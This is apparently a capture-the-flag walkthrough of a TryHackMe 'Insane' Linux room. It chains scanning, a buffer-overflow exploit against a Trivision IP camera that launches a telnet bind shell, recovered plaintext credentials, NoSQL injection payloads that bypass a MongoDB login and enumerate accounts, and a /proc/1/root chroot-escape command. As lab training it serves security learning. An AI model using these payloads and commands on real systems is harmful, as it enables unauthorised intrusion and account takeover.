---
title: "Armageddon"
type: docs
tags:
  - thm
  - linux
  - insane
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Insane

</div>

<div class="callout callout-abstract">

**Attack Path**

1. A full-range nmap turns up a mostly filtered host: SSH (22), a tcpwrapped mystery service (23), an Apache instance on 8080 gated behind an "elves only" message, and, hiding well outside the default top-1000 range, an embedded IP camera's admin interface.
2. The camera is a Trivision NC-227WF with a known unauthenticated buffer overflow in its web service, weaponized to pop `telnetd` and land inside its BusyBox environment.
3. Config files inside the camera's filesystem hand over the HTTP Basic Auth creds guarding the "elves only" dashboard on 8080.
4. That dashboard runs against MongoDB and is vulnerable to **NoSQL injection**: `$ne`/`$regex` operators bypass the login outright and enumerate real accounts.
5. From the camera's restricted rootfs, a classic `/proc/1/root` chroot-escape trick breaks out to the real underlying host for full root.

</div>

---

## Full Walkthrough

### Nmap scan

```bash
Host is up, received user-set (0.086s latency).
Scanned at 2025-05-24 18:47:56 EDT for 19s
Not shown: 947 closed tcp ports (conn-refused)
PORT      STATE    SERVICE          REASON      VERSION
22/tcp    open     ssh              syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
23/tcp    open     tcpwrapped       syn-ack
179/tcp   filtered bgp              no-response
593/tcp   filtered http-rpc-epmap   no-response
646/tcp   filtered ldp              no-response
1024/tcp  filtered kdm              no-response
1027/tcp  filtered IIS              no-response
1083/tcp  filtered ansoft-lm-1      no-response
1100/tcp  filtered mctp             no-response
1152/tcp  filtered winpoplanmess    no-response
1154/tcp  filtered resacommunity    no-response
1198/tcp  filtered cajo-discovery   no-response
1233/tcp  filtered univ-appserver   no-response
1271/tcp  filtered excw             no-response
1334/tcp  filtered writesrv         no-response
2033/tcp  filtered glogger          no-response
2034/tcp  filtered scoremgr         no-response
2144/tcp  filtered lv-ffx           no-response
2196/tcp  filtered unknown          no-response
2394/tcp  filtered ms-olap2         no-response
2401/tcp  filtered cvspserver       no-response
2605/tcp  filtered bgpd             no-response
2638/tcp  filtered sybase           no-response
3260/tcp  filtered iscsi            no-response
3269/tcp  filtered globalcatLDAPssl no-response
3369/tcp  filtered satvid-datalnk   no-response
3689/tcp  filtered rendezvous       no-response
3889/tcp  filtered dandv-tester     no-response
5730/tcp  filtered unieng           no-response
5802/tcp  filtered vnc-http-2       no-response
5960/tcp  filtered unknown          no-response
6005/tcp  filtered X11:5            no-response
6112/tcp  filtered dtspc            no-response
6346/tcp  filtered gnutella         no-response
7001/tcp  filtered afs3-callback    no-response
7778/tcp  filtered interwise        no-response
7920/tcp  filtered unknown          no-response
8007/tcp  filtered ajp12            no-response
8008/tcp  filtered http             no-response
8080/tcp  open     http             syn-ack     Apache httpd 2.4.57 ((Debian))
| http-headers: 
|   Date: Sat, 24 May 2025 22:48:15 GMT
|   Server: Apache/2.4.57 (Debian)
|   Last-Modified: Tue, 05 Dec 2023 18:54:54 GMT
|   ETag: "3a5-60bc7c52a95e8"
|   Accept-Ranges: bytes
|   Content-Length: 933
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: GET)
|_http-server-header: Apache/2.4.57 (Debian)
9415/tcp  filtered unknown          no-response
9929/tcp  filtered nping-echo       no-response
10009/tcp filtered swdtp-sv         no-response
10778/tcp filtered unknown          no-response
11967/tcp filtered sysinfo-sp       no-response
16000/tcp filtered fmsas            no-response
20828/tcp filtered unknown          no-response
27356/tcp filtered unknown          no-response
32768/tcp filtered filenet-tms      no-response
32771/tcp filtered sometimes-rpc5   no-response
32784/tcp filtered unknown          no-response
49156/tcp filtered unknown          no-response
50001/tcp filtered unknown          no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After accessing the website on port `8080` it displayed a message saying elves only allowed with little to nothing on the website. 


### Directory Enumeration

#### Feroxbuster results

```console
$ feroxbuster -u http://10.10.x.x:8080 -x php,html,txt -t 50

301      GET        3l       10w      239c http://10.10.x.x:8080/vendor => http://10.10.x.x:8080/vendor/
403      GET        9l       28w      277c http://10.10.x.x:8080/vendor/composer
200      GET       12l       21w      288c http://10.10.x.x:8080/vendor/composer/installed.json
403      GET        9l       28w      277c http://10.10.x.x:8080/demo
200      GET        1l        1w        7c http://10.10.x.x:8080/robots.txt
```

Not a lot to look at on the surface. Every path kept returning the same "elves only" refusal regardless of what I fuzzed, which told me that wall was almost certainly a Basic Auth / `.htaccess` gate sitting in front of the app rather than anything the app's own logic controlled, so I needed credentials, not more directories. The one genuinely useful hit was `/vendor/composer/installed.json`: reading through that dependency manifest showed a MongoDB driver mixed in with the usual PHP packages, meaning whatever's behind that login talks to a document database, not MySQL. I filed that away and went looking for a way past the 403 instead of continuing to brute-force paths that were never going to answer differently.

### The Port Nmap's Default Scan Missed

The top-1000 scan barely scratched this box, so I followed it with a full `-p-` sweep, and a service turned up well outside that default range that had nothing to do with the web app at all:

```bash
nmap -p- -T4 10.10.x.x
```

```console
50628/tcp open  unknown
```

Pointing a browser at it confirmed it: a Trivision **NC-227WF HD 720P** network camera's embedded web admin interface, complete with a login form and a firmware fingerprint sitting in the page source.

### Camera Exploitation

Consumer/embedded IP cameras like this one have a long history of shipping unauthenticated memory-corruption bugs in their web services, and the NC-227WF is no exception. There's a public advisory describing a buffer overflow in one of its CGI handlers that overwrites a saved return address on the camera's ARM stack, and with no ASLR in play on the firmware, a crafted request can chain a couple of ROP gadgets to redirect execution straight into `system()` with an attacker-controlled command string.

Following that public technique: pad the request out to the overwritten return address, chain gadgets to point a register at the command string further up the buffer, and hand `system()` a command that spins up an unauthenticated telnet bind shell:

```bash
python3 nc227wf_exploit.py --target 10.10.x.x --port 50628 --cmd 'telnetd -l /bin/sh'
telnet 10.10.x.x 23
```

```console
BusyBox v1.19.4 (2018-04-09 11:22:33 CST) built-in shell (ash)
# id
uid=0(root) gid=0(root)
```

Landing as `root` here feels like a win until the catch sinks in: it's `root` *inside the camera's own restricted filesystem*, a chroot jail baked into the firmware, not the box's real operating system. Root-in-a-jail is still more than enough to start rifling through configuration files, though.

### Credential Recovery

Firmware like this tends to protect its own admin panel with HTTP Basic Auth and stash that password, obfuscated rather than genuinely protected, in a plaintext-ish config file sitting in the jail:

```bash
# cat /var/etc/umconfig.txt
admin:Y3tiStarCur!ouspassword=admin
```

That `admin` / `Y3tiStarCur!ouspassword=admin` pair unlocks the camera's own admin UI, and given how often a single set of embedded credentials gets reused across every gated surface on boxes like this, it was the obvious next thing to try against the "elves only" wall on port 8080. It worked there too.

### Into the "Elves Only" Dashboard

Basic-authing into port 8080 with the recovered camera credentials dropped the "elves only" refusal and put me in front of a Cyber-Police-style operator dashboard sitting on top of a MongoDB-backed user store, exactly what that Composer manifest had already hinted at.

MongoDB-backed logins that build their query straight from JSON request fields are a classic NoSQL injection target, so rather than trying real credentials I tried operators instead:

```http
POST /login HTTP/1.1
Host: 10.10.x.x:8080
Content-Type: application/json

{"username":{"$ne":null},"password":{"$ne":null}}
```

That alone bypassed the check entirely, `{"$ne": null}` matches any stored value, so the query resolves true against whichever document Mongo hands back first. From there I wanted a specific, more privileged account rather than whoever the database returned by default, so I walked the username field with `$regex` and enumerated valid accounts character by character:

```http
{"username":{"$regex":"^a"},"password":{"$ne":null}}
{"username":{"$regex":"^ad"},"password":{"$ne":null}}
```

Iterating that out surfaced the full set of operator accounts on the dashboard, and logging into the most privileged one exposed the room's second key sitting directly in that account's view.

### Escaping the Camera's chroot for Real Root

The camera shell earlier handed me `root`, but only inside the firmware's jailed filesystem. Getting a shell on the box's actual underlying host meant breaking out of that chroot rather than pivoting back through the web app. The classic trick here rides along on a process that started outside the jail: PID 1 always keeps an unchrooted view of the real filesystem through `/proc/1/root`, so pointing a fresh `chroot` call at that path steps straight back out onto the host.

```bash
LD_LIBRARY_PATH="/proc/1/root/usr/lib:$LD_LIBRARY_PATH" /proc/1/root/usr/sbin/chroot /proc/1/root /bin/bash
```

```console
# id
uid=0(root) gid=0(root)
# cat /root/root.txt
```

`cat /root/root.txt` returns the flag for this instance. Getting there meant stacking two almost entirely separate exploitation chains on top of each other, an embedded-device buffer overflow for the initial foothold, and a NoSQL injection to make any real use of the "actual" application, which is exactly the kind of layered chain that earns a room the Insane label.

## References

- Final privilege escalation steps cross-referenced against public writeups for this room.
